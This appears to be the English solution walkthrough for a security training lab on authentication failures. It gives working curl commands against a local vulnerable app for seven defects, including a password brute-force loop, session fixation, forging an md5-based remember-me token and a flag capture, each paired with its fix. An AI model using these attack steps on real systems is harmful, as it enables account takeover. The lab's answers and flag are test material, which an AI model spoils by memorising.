🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A07 — Solution walkthrough (spoilers)

All examples are `curl` against `http://127.0.0.1:8061` (vulnerable). Where
cookies matter, we use `-c cookies.txt -b cookies.txt`. The texts printed by
the application itself are left in Russian, as in the real output; an English
gloss is given in parentheses.

## Defect 1 — a weak password policy

```bash
curl -s -X POST http://127.0.0.1:8061/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"eve","password":"1"}'
# {"ok": true} — the password "1" is accepted without question
```

**Rule:** registration is the only point where a weak password can be kept
out of the system. The test account `bob` in this lab was created with the
password `123456` precisely because this check was missing in the past —
weak passwords "live" in the database for years if they were not stopped at
the entrance.

**Fix:** `password_policy_error()` — at least 8 characters and a ban on
common passwords (`# FIX 1`, applied in both `/register` and
`/change-password`).

## Defect 2 — user enumeration

```bash
curl -s -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"nosuchuser","password":"x"}'
# 404 "пользователь не найден" (user not found)

curl -s -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"alice","password":"wrong"}'
# 401 "неверный пароль" (wrong password)
```

From the difference in the code and the text of the response you can build a
list of existing logins by brute force, without knowing a single password.

**Fix:** the same code and message `401 "неверный логин или пароль"` (wrong
login or password) in both cases (`# FIX 2`).

## Defect 3 — no brute-force protection

```bash
for pw in 111111 password 123456 qwerty 12345678; do
  r=$(curl -s -X POST http://127.0.0.1:8061/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"bob\",\"password\":\"$pw\"}")
  echo "$pw -> $r"
done
# pw=123456 -> {"ok": true, "role": "user", "user": "bob"}
```

No pauses, no captcha, no lockout — a short dictionary breaks an account
with the password `123456` in seconds.

**Fix:** a counter of failed attempts per login, a 60-second lockout after 5
failures in a row (`# FIX 3`). Together with FIX 2 this is both brute-force
protection and no leak of which parameter was wrong.

## Defect 4 — session fixation

The key idea: the server hands out a `sid` before login (on `GET /`) and
**does not change it** after successful authentication. So if two parties
accidentally or deliberately end up with the same `sid` before login, then
after one of them logs in the other one gets access too.

```bash
# 1. The "attacker" gets a sid BEFORE any login
curl -s -c atk.txt http://127.0.0.1:8061/ > /dev/null
ATK_SID=$(grep sid atk.txt | awk '{print $7}')
echo "attacker's sid: $ATK_SID"

# 2. The "victim" (admin) logs in using EXACTLY this sid
#    (in a real attack the victim is made to open a link with this sid,
#    here for the demonstration we reuse it directly)
curl -s -b "sid=$ATK_SID" -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Adm1n-Str0ng-Pass!2025"}'

# 3. The attacker uses THEIR OWN old cookie file — the sid in it is authenticated as admin
curl -s -b atk.txt http://127.0.0.1:8061/admin
# {"flag": "FLAG{A07_remember_me_token_is_just_md5_of_username}", ...}
```

**Rule:** a session identifier must be considered compromised if it existed
before the moment of login. It cannot be trusted after authentication — a new
one is needed.

**Fix:** `fixed/app.py` does not hand out a `sid` before login at all
(`GET /` no longer creates an anonymous session), and on a successful
`/login` a new `sid` is always generated, and the old one (if it was sent) is
deleted (`# FIX 4`).

## Defect 5 — logout does not invalidate the session on the server

```bash
curl -s -c s.txt -X POST http://127.0.0.1:8061/login \
  -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice-Good-Pass1"}'
SID=$(grep sid s.txt | awk '{print $7}')

curl -s -b s.txt -X POST http://127.0.0.1:8061/logout
# {"ok": true, "message": "вы вышли"} (you have logged out)

curl -s -b "sid=$SID" http://127.0.0.1:8061/me
# {"role": "user", "user": "alice"} — the session is still active!
```

If the `sid` was intercepted (a stolen cookie, XSS, a public computer) before
the owner pressed "log out", the "logout" changes nothing for the thief.

**Fix:** `/logout` deletes the record from the server-side `SESSIONS` (and
the related `remember_token` from `REMEMBER`), not only the cookies in the
response (`# FIX 5`).

## Defect 6 — a predictable "remember me" token

The token in `vulnerable/app.py` is `md5(username)`, which can be computed
without contacting the server at all:

```bash
python3 -c "import hashlib; print(hashlib.md5(b'admin').hexdigest())"
# -> a concrete value, for example 21232f297a57a5a743894a0e4a801fc3

curl -s -c a.txt -b "remember_token=21232f297a57a5a743894a0e4a801fc3" \
  http://127.0.0.1:8061/auto-login
# {"ok": true, "user": "admin", "note": "вход по remember_token"} (login by remember_token)

curl -s -b a.txt http://127.0.0.1:8061/admin
# the flag
```

All the attacker needs to know is the login `admin` (not a secret).

**Rule:** a persistent token is a secret just like a password. It must not be
computed deterministically from public data; it must be a random value with
enough entropy, which the server stores and compares, not recomputes.

**Fix:** `secrets.token_urlsafe(32)`, only the `sha256` hash of the token
with an expiry time is stored on the server; the token is rotated on every
use (`# FIX 6`).

## Defect 7 — a password change without the current password

With any active (including hijacked) session:

```bash
curl -s -b atk.txt -X POST http://127.0.0.1:8061/change-password \
  -H 'Content-Type: application/json' -d '{"new_password":"hacked-by-attacker"}'
# {"ok": true, "message": "пароль изменён"} (password changed) — the admin never entered a password!
```

This turns *any* temporary session takeover (through defects 1, 4 or 6) into
a *permanent* loss of the account: the password is changed, and the
legitimate owner can no longer log in.

**Fix:** `/change-password` requires `current_password`, compared with
`hmac.compare_digest`, and the new password is subject to the same policy as
at registration (`# FIX 7`).

## Summary

Not one of the seven defects lives in a single vulnerable function like
`eval()` or SQL string concatenation — each is about **which decision was not
made when designing authentication**: when to reissue the session
identifier, what to treat as a secret, how many attempts to allow, which
response must reveal nothing, and when to require re-confirmation of
identity. This is fully in the spirit of A06 Insecure Design, but focused
specifically on "who you are" — hence the separate category A07.
